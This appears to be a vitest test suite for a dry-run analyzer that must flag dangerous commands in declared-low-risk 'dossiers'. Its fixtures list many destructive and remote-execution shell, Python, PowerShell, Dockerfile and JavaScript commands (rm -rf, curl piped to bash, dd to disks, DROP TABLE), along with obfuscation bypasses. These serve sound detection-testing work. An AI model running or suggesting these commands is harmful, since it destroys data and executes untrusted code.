import { describe, expect, it } from 'vitest';
import { analyzeDryRun, type DryRunPlan, LEVEL_HIGH_MIN } from '../dry-run';
import fixtures from './dry-run-review-fixtures.json';

/** A dossier that DECLARES itself low risk: observed behaviour alone must drive the level. */
function lowRiskDossier(body: string, frontmatter: Record<string, unknown> = {}): string {
  const fm = JSON.stringify(
    {
      dossier_schema_version: '1.0.0',
      title: 'T',
      version: '1.0.0',
      risk_level: 'low',
      ...frontmatter,
    },
    null,
    2
  );
  return `---dossier\n${fm}\n---\n\n${body}\n`;
}

const fence = (lang: string, code: string) => `\`\`\`${lang}\n${code}\n\`\`\``;
const analyze = (lang: string, code: string, fm: Record<string, unknown> = {}): DryRunPlan =>
  analyzeDryRun(lowRiskDossier(fence(lang, code), fm));

const atLeastHigh = (plan: DryRunPlan) => plan.risk_score >= LEVEL_HIGH_MIN;
const listed = (plan: DryRunPlan, needle: string) =>
  plan.commands.some((c) => c.command.includes(needle));
const destructiveListed = (plan: DryRunPlan, needle: string) =>
  plan.commands.some((c) => c.kind === 'destructive' && c.command.includes(needle));

/** Each case: lang, code, and a fragment that must appear in a listed command. */
function expectDangerous(cases: Array<[string, string, string]>) {
  for (const [lang, code, needle] of cases) {
    const plan = analyze(lang, code);
    expect(atLeastHigh(plan), `${code} scored ${plan.risk_score}`).toBe(true);
    expect(['high', 'critical']).toContain(plan.level);
    expect(listed(plan, needle), `${code} did not list ${needle}`).toBe(true);
  }
}

describe('#933 gap 1: heredoc into a shell is code, not data', () => {
  it('analyses the body of `bash <<EOF`', () => {
    const plan = analyze('bash', "bash <<'EOF'\nrm -rf ~\ngit push --force\nEOF");
    expect(destructiveListed(plan, 'rm -rf ~')).toBe(true);
    expect(destructiveListed(plan, 'git push --force')).toBe(true);
    expect(atLeastHigh(plan)).toBe(true);
  });

  it('follows sudo / ssh / docker exec / pipe-to-shell heredocs', () => {
    expectDangerous([
      ['bash', 'sudo -E sh <<EOF\nrm -rf /\nEOF', 'rm -rf /'],
      ['bash', 'ssh prod bash -s <<EOF\nrm -rf /srv\nEOF', 'rm -rf /srv'],
      ['bash', 'docker exec -i c sh <<EOF\nrm -rf /data\nEOF', 'rm -rf /data'],
      ['bash', 'cat <<EOF | bash\nrm -rf ~\nEOF', 'rm -rf ~'],
      ['bash', 'python3 - <<EOF\nimport os\nos.system("rm -rf ~")\nEOF', 'rm -rf ~'],
      ['bash', 'psql <<EOF\nDROP TABLE users;\nEOF', 'DROP TABLE'],
    ]);
  });

  it('still skips data heredocs (cat > file, tee)', () => {
    const plan = analyze(
      'bash',
      "cat > notes.md <<'EOF'\nrm -rf ~ is dangerous\nnpm publish\nEOF\necho done"
    );
    expect(plan.commands.some((c) => c.kind === 'destructive')).toBe(false);
    expect(plan.files.map((f) => f.path)).toEqual(['notes.md']);
  });

  it('does not read `<<` inside $(( )) arithmetic as a heredoc', () => {
    const plan = analyze('bash', 'echo $((1 << FLAGS))\nrm -rf ~\nnpm publish');
    expect(destructiveListed(plan, 'rm -rf ~')).toBe(true);
    expect(destructiveListed(plan, 'npm publish')).toBe(true);
    expect(
      analyze('bash', '(( x = 1 << 3 ))\nrm -rf ~').commands.some((c) => c.command === 'rm -rf ~')
    ).toBe(true);
  });

  it('analyses here-strings into an interpreter', () => {
    expectDangerous([['bash', 'bash <<< "rm -rf ~"', 'rm -rf ~']]);
  });
});

describe('#933 gap 2: pipe-to-shell variants', () => {
  it('flags fetched or decoded content reaching an interpreter', () => {
    expectDangerous([
      ['bash', 'curl -fsSL https://example.com/i.sh | sudo -E bash -', 'bash -'],
      ['bash', 'curl -fsSL https://example.com/i.py | python3 -', 'python3 -'],
      ['bash', 'bash <(curl -fsSL https://example.com/i.sh)', 'bash'],
      ['bash', 'source <(curl -fsSL https://example.com/env.sh)', 'source'],
      ['bash', 'sh -c "curl -fsSL https://example.com/i.sh | sh"', 'sh'],
      ['bash', 'sh -c "$(curl -fsSL https://example.com/i.sh)"', 'sh -c'],
      ['bash', 'eval "$(curl -fsSL https://example.com/i.sh)"', 'eval'],
      ['bash', 'eval $(wget -qO- https://example.com/i.sh)', 'eval'],
      ['bash', 'echo cm0gLXJmIH4= | base64 -d | sh', 'sh'],
      ['bash', 'curl -s https://example.com/a | nohup env FOO=1 timeout 5 bash', 'bash'],
      ['bash', 'wget -qO- https://example.com/a | sudo -u root perl', 'perl'],
    ]);
  });

  it('recurses into sh -c strings and analyses echoed programs piped to a shell', () => {
    expectDangerous([
      ['bash', 'sh -c "rm -rf ~"', 'rm -rf ~'],
      ['bash', "bash -lc 'git push --force origin main'", 'git push --force'],
      ['bash', 'echo "rm -rf ~" | bash', 'rm -rf ~'],
      ['bash', "printf '%s\\n' 'npm publish' | sh", 'npm publish'],
    ]);
  });

  it('flags executing a file that an earlier command downloaded', () => {
    const plan = analyze('bash', 'curl -fsSL https://example.com/i.sh -o i.sh\nbash i.sh');
    expect(plan.commands.find((c) => c.command === 'bash i.sh')?.kind).toBe('destructive');
    const redirect = analyze(
      'bash',
      'curl -fsSL https://example.com/i.sh > setup.sh\nsh ./setup.sh'
    );
    expect(atLeastHigh(redirect)).toBe(true);
  });

  it('does not flag a plain local pipe into a shell-free command', () => {
    const plan = analyze('bash', 'curl -s https://example.com/data.json | jq .name');
    expect(plan.commands.some((c) => c.kind === 'destructive')).toBe(false);
    expect(atLeastHigh(plan)).toBe(false);
  });
});

describe('#933 gap 3: exec-capable tools are classified by what they run', () => {
  it('classifies wrapped commands', () => {
    expectDangerous([
      ['bash', 'find ~ | xargs rm -rf', 'xargs rm -rf'],
      ['bash', 'find . -name "*.log" -print0 | xargs -0 -n1 rm -f', 'xargs'],
      ['bash', 'env rm -rf ~', 'env rm -rf ~'],
      ['bash', 'env -i FOO=1 rm -rf ~', 'rm -rf ~'],
      ['bash', 'sudo -u root rm -rf /', 'sudo -u root rm -rf /'],
      ['bash', 'sudo -Eu root rm -rf /', 'rm -rf /'],
      ['bash', 'nohup rm -rf ~ &', 'rm -rf ~'],
      ['bash', 'timeout 5 rm -rf ~', 'timeout 5 rm -rf ~'],
      ['bash', 'command rm -rf ~', 'rm -rf ~'],
      ['bash', '/usr/bin/env rm -rf ~', 'rm -rf ~'],
      ['bash', 'awk \'BEGIN{system("rm -rf ~")}\'', 'rm -rf ~'],
      ['bash', 'find / -name x -exec rm -rf {} ;', 'rm -rf'],
      ['bash', "trap 'rm -rf ~' EXIT", 'rm -rf ~'],
    ]);
  });

  it('treats sourcing a script as executing it, not as a read', () => {
    expect(analyze('bash', 'source ./env.sh').commands[0].kind).toBe('local_write');
  });

  it('keeps harmless uses of the same tools low', () => {
    const plan = analyze(
      'bash',
      "env FOO=1 node build.js\nxargs -n1 echo\nawk '{print $1}' f.txt\ncommand -v git\nsudo ls /root\nls | xargs -I{} echo {}"
    );
    expect(plan.commands.some((c) => c.kind === 'destructive')).toBe(false);
    expect(plan.commands.find((c) => c.command.startsWith('awk'))?.kind).toBe('read');
    expect(plan.commands.find((c) => c.command.startsWith('command'))?.kind).toBe('read');
  });
});

describe('#933 gap 4: non-shell fences', () => {
  it('PowerShell', () => {
    const plan = analyze(
      'powershell',
      'iwr https://example.com/a.ps1 | iex\nRemove-Item -Recurse -Force C:\\data'
    );
    expect(destructiveListed(plan, 'iwr')).toBe(true);
    expect(plan.files).toContainEqual(expect.objectContaining({ operation: 'delete' }));
    expect(atLeastHigh(plan)).toBe(true);
    expectDangerous([
      [
        'ps1',
        '$s = Invoke-RestMethod https://example.com/a\nInvoke-Expression $s',
        'Invoke-Expression',
      ],
      ['pwsh', 'Format-Volume -DriveLetter D', 'Format-Volume'],
      ['bat', 'del /s /q C:\\*', 'del'],
    ]);
  });

  it('Python', () => {
    expectDangerous([
      ['python', 'import os\nos.system("rm -rf ~")', 'rm -rf ~'],
      ['python', 'import subprocess\nsubprocess.run(["rm", "-rf", "/"])', 'rm -rf /'],
      ['python', 'subprocess.check_output("git push --force", shell=True)', 'git push --force'],
      ['python', 'import shutil\nshutil.rmtree("/var/data")', 'shutil.rmtree'],
      ['py', 'exec(requests.get("https://example.com/x").text)', 'exec'],
    ]);
  });

  it('Dockerfile', () => {
    expectDangerous([
      ['dockerfile', 'FROM node\nRUN rm -rf /var/lib/apt', 'rm -rf /var/lib/apt'],
      [
        'dockerfile',
        'FROM node\nRUN apt-get update \\\n && curl -fsSL https://example.com/i.sh | sh',
        'sh',
      ],
      ['docker', 'FROM node\nCMD ["sh", "-c", "rm -rf /data"]', 'rm -rf /data'],
    ]);
  });

  it('JavaScript / TypeScript', () => {
    expectDangerous([
      ['js', "const { execSync } = require('child_process');\nexecSync('rm -rf ~');", 'rm -rf ~'],
      [
        'ts',
        "import { spawnSync } from 'node:child_process';\nspawnSync('git', ['push', '--force']);",
        'git push --force',
      ],
      ['js', "fs.rmSync('/var/data', { recursive: true });", 'fs.rmSync'],
      ['js', "eval(await (await fetch('https://example.com/x.js')).text());", 'eval'],
    ]);
  });

  it('inline interpreter code (python -c / node -e) is analysed with the right language', () => {
    expectDangerous([
      ['bash', `python3 -c 'import os; os.system("rm -rf ~")'`, 'rm -rf ~'],
      ['bash', `node -e "require('child_process').execSync('rm -rf ~')"`, 'rm -rf ~'],
    ]);
  });

  it('CI yaml run steps', () => {
    expectDangerous([
      ['yaml', 'steps:\n  - run: rm -rf ~\n', 'rm -rf ~'],
      [
        'yaml',
        'steps:\n  - name: x\n    run: |\n      echo hi\n      git push --force\n',
        'git push --force',
      ],
    ]);
  });

  it('reports languages it did not analyse instead of silently scoring them as empty', () => {
    const plan = analyzeDryRun(
      lowRiskDossier(
        `${fence('go', 'os.RemoveAll("/")')}\n\n${fence('json', '{"a":1}')}\n\n${fence('rust', 'fn main(){}')}`
      )
    );
    expect(plan.unanalyzed_fences.map((f) => f.lang)).toEqual(['go', 'rust']);
  });

  it('leaves data languages and benign code low', () => {
    const plan = analyzeDryRun(
      lowRiskDossier(
        [
          fence('json', '{"rm": "-rf ~"}'),
          fence('python', 'print("rm -rf ~ is bad")\nx = [1, 2, 3]'),
          fence('js', 'const x = re.exec(s);\nconsole.log("rm -rf ~");'),
          fence('dockerfile', 'FROM node\nWORKDIR /app\nCOPY . .'),
        ].join('\n\n')
      )
    );
    expect(plan.commands.some((c) => c.kind === 'destructive')).toBe(false);
    expect(plan.level).toBe('low');
  });
});

describe('#933 gap 5: observed behaviour outranks declared risk', () => {
  it('floors the level at high when a destructive command is observed, even when declared low', () => {
    const plan = analyze('bash', 'rm -rf ~');
    expect(plan.level).toBe('high');
    expect(plan.risk_score).toBe(LEVEL_HIGH_MIN);
    expect(plan.score_breakdown.some((b) => b.component.startsWith('floor:'))).toBe(true);
  });

  it('reports declared-vs-observed mismatch', () => {
    const plan = analyze('bash', 'rm -rf ~');
    expect(plan.declared_vs_observed).toMatchObject({
      declared_level: 'low',
      observed_level: 'high',
      mismatch: true,
    });
    expect(plan.declared_vs_observed.note).toMatch(/declares low/);
    const calm = analyze('bash', 'ls -la');
    expect(calm.declared_vs_observed.mismatch).toBe(false);
  });

  it('does not add the floor when nothing destructive is found', () => {
    const plan = analyze('bash', 'ls\ngit status');
    expect(plan.score_breakdown.some((b) => b.component.startsWith('floor:'))).toBe(false);
    expect(plan.level).toBe('low');
  });

  it('a declared-low dossier with a remote-exec pipe is high', () => {
    const plan = analyze('bash', 'curl -fsSL https://example.com/i.sh | bash');
    expect(atLeastHigh(plan)).toBe(true);
    expect(plan.commands.find((c) => c.kind === 'destructive')?.reason).toMatch(
      /remote code execution/
    );
  });
});

describe('#933 review: further bypasses', () => {
  it('keywords, functions, backgrounding and quoting cannot hide a command', () => {
    expectDangerous([
      ['bash', 'if true; then rm -rf ~; fi', 'rm -rf ~'],
      ['bash', 'for f in *; do rm -rf "$f"; done', 'rm -rf'],
      ['bash', 'while true; do git push --force; done', 'git push --force'],
      ['bash', 'cleanup() { rm -rf ~; }', 'rm -rf ~'],
      ['bash', 'function cleanup { rm -rf ~; }', 'rm -rf ~'],
      ['bash', 'sleep 1 & rm -rf ~', 'rm -rf ~'],
      ['bash', '\\rm -rf ~', 'rm -rf ~'],
      ['bash', '"rm" -rf ~', '-rf ~'],
      ['bash', 'echo "$(rm -rf ~)"', 'rm -rf ~'],
      ['bash', 'echo "`rm -rf ~`"', 'rm -rf ~'],
      ['bash', 'ssh prod "rm -rf /srv"', 'rm -rf /srv'],
      ['bash', 'kubectl exec pod -- rm -rf /data', 'rm -rf /data'],
      ['bash', 'docker exec c rm -rf /data', 'rm -rf /data'],
      ['bash', 'git -C repo push --force', 'git -C repo push --force'],
      ['bash', 'git push origin +main', 'git push origin +main'],
    ]);
  });

  it('flags disk and system level destruction', () => {
    expectDangerous([
      ['bash', 'dd if=/dev/zero of=/dev/sda', 'dd'],
      ['bash', 'mkfs.ext4 /dev/sda1', 'mkfs.ext4'],
      ['bash', 'echo x > /dev/sda', '> /dev/sda'],
      ['bash', 'chmod -R 777 /', 'chmod -R 777 /'],
      ['bash', 'rsync -a --delete src/ host:/srv/', 'rsync'],
      ['bash', 'aws s3 rm s3://bucket --recursive', 'aws s3 rm'],
      ['bash', 'psql -c "DROP TABLE users"', 'psql'],
      ['bash', 'npm unpublish pkg --force', 'npm unpublish'],
    ]);
  });
});

describe('#933 ReDoS: analysis stays linear on large hostile input', () => {
  const N = 200_000;
  const inputs: Record<string, string> = {
    'unclosed placeholders': '<a '.repeat(N / 3),
    'placeholder chain': '<a <b> '.repeat(N / 7),
    'lone quotes': "' ".repeat(N / 2),
    'lone double quotes': '" '.repeat(N / 2),
    'command substitutions': '$('.repeat(N / 2),
    'nested parens': '('.repeat(N),
    'heredoc markers': '<<E '.repeat(N / 4),
    arithmetic: '(( '.repeat(N / 3),
    pipes: 'a|'.repeat(N / 2),
    wrappers: 'sudo env nohup '.repeat(N / 15),
    'sh -c nesting': `${'sh -c "'.repeat(2000)}rm -rf ~${'"'.repeat(2000)}`,
    'sed s///e': `sed 's/${'a/'.repeat(N / 2)}'`,
    'one giant line': `echo ${'a'.repeat(N)}; rm -rf ~`,
  };

  for (const [name, payload] of Object.entries(inputs)) {
    it(`bash fence: ${name}`, () => {
      const t = Date.now();
      analyze('bash', payload);
      expect(Date.now() - t).toBeLessThan(3000);
    });
  }

  it('non-shell fences with hostile lines', () => {
    const t = Date.now();
    for (const lang of ['python', 'js', 'powershell', 'dockerfile', 'ruby', 'sql', 'yaml']) {
      analyze(
        lang,
        `${'x = "'.repeat(50_000)}\n${'os.system('.repeat(20_000)}\n${'RUN a && '.repeat(20_000)}`
      );
    }
    expect(Date.now() - t).toBeLessThan(5000);
  });

  it('a huge dossier with many fences', () => {
    const body = Array.from({ length: 5000 }, (_, i) =>
      fence('bash', `echo ${i}\nrm -rf /tmp/${i}`)
    ).join('\n\n');
    const t = Date.now();
    const plan = analyzeDryRun(lowRiskDossier(body));
    expect(Date.now() - t).toBeLessThan(5000);
    expect(plan.commands.length).toBe(10_000);
  });

  it('deep or self-nesting input fails closed instead of being skipped', () => {
    let deep = 'ls';
    for (let i = 0; i < 9; i++) deep = `echo "$(${deep})"`;
    const plan = analyze('bash', deep);
    expect(atLeastHigh(plan)).toBe(true);
    expect(plan.commands.some((c) => c.reason?.includes('too deep'))).toBe(true);
  });

  it('thousands of harmless lines before a dangerous one do not exhaust the analyzer', () => {
    const plan = analyze('bash', `${'ls\n'.repeat(30_000)}rm -rf ~`);
    expect(destructiveListed(plan, 'rm -rf ~')).toBe(true);
    const nested = analyze('bash', `${'sh -c "ls"\n'.repeat(5_000)}sh -c "rm -rf ~"`);
    expect(destructiveListed(nested, 'rm -rf ~')).toBe(true);
  });

  it('padding cannot push a dangerous command out of view', () => {
    const plan = analyze('bash', `echo ${'a'.repeat(100_000)}; rm -rf ~`);
    expect(destructiveListed(plan, 'rm -rf ~')).toBe(true);
  });
});

describe('#933 review round 2: independent adversarial probe suite', () => {
  // Every case is dangerous and declared low: each must reach high (or be listed as not analysable).
  for (const c of fixtures as Array<{ name: string; lang: string; code: string }>) {
    it(c.name, () => {
      const plan = analyze(c.lang, c.code);
      expect(atLeastHigh(plan), `${c.code} scored ${plan.risk_score}`).toBe(true);
    });
  }

  it('unknown is not safe: unresolvable command words are listed as not analysable', () => {
    for (const code of [
      '$X -rf ~',
      'X=rm; $X -rf ~',
      "$'\\x72m' -rf ~",
      '{rm,-rf,~}',
      // biome-ignore lint/suspicious/noTemplateCurlyInString: literal shell text under test
      'rm${IFS}-rf${IFS}~',
    ]) {
      const plan = analyze('bash', code);
      expect(
        plan.commands.some((c) => c.reason?.startsWith('not analysable')),
        code
      ).toBe(true);
      expect(plan.level).not.toBe('low');
    }
  });

  it('does not flag quoted variables that are only arguments, [[ ]] tests or array appends', () => {
    const plan = analyze(
      'bash',
      'gh issue view "$N"\n[[ -n "$A" && "$B" == "$A"* ]] && F=1 || F=0\narr+=("$N")\nls "$DIR"'
    );
    expect(plan.commands.some((c) => c.reason?.startsWith('not analysable'))).toBe(false);
    expect(plan.level).toBe('low');
  });
});
